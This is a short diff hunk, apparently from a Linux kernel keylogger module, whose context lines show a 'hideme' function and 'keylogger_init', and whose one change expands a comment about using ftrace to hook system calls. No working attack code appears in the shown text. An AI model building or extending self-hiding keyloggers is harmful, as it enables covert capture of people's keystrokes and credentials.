@@ -224,7 +224,7 @@ void hideme(void)
 }
 
 
-// should try ftrace
+// should try ftrace to hook the syscalls
 
 /* init function */
 static int keylogger_init(void)
